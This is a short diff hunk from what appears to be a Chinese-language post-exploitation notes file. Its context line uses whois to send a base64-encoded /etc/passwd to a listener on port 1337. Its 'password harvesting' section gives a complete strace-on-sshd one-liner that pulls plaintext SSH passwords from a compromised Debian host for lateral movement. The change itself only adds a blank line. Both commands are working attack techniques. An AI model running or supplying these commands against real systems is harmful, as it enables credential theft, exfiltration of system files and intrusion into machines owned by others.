@@ -321,6 +321,7 @@ whois -h 127.0.0.1 -p 1337 `cat /etc/passwd | base64`
 ## 口令抓取
 
 当我们拿下 windows 机器时可以通过抓内存中的密码进行横向，但 linux 却不可能抓到内存中的密码，但是 Debian 系列下的 linux 系统可以通过监听 sshd 进程的数据抓取出明文密码，比如你拿下了一台管理员机器，上面由 xshell，你可以手动开一个监听，在开一个登录，监听的窗口上就抓出密码了
+
 ```bash
 strace -xx -fp `cat /var/run/sshd.pid` 2>&1| grep --line-buffered -P 'write\(\d, "\\x00' | perl -lne '$|++; @F=/"\s*([^"]+)\s*"/g;for (@F){tr/\\x//d}; print for @F'|grep --line-buffered -oP '.{8}\K([2-7][0-9a-f])*$'|grep --line-buffered -v '^64$'|perl -pe 's/([0-9a-f]{2})/chr hex $1/gie'
 ```
